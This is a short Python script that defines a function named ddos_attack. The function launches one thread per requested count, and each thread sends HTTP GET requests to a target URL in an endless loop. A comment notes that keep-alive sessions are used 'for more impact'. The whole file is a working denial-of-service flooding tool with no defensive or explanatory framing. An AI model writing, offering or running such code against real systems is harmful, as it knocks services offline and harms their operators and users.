import requests
import threading

def ddos_attack(target_url, request_count):
    def send_request():
        while True:
            try:
                # Using a session with keep-alive for more impact
                session = requests.Session()
                session.headers.update({'Connection': 'keep-alive'})
                response = session.get(target_url, timeout=5)
                print(f"Request sent, status code: {response.status_code}")
            except requests.RequestException as e:
                print(f"Error: {e}")

    threads = []
    for _ in range(request_count):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
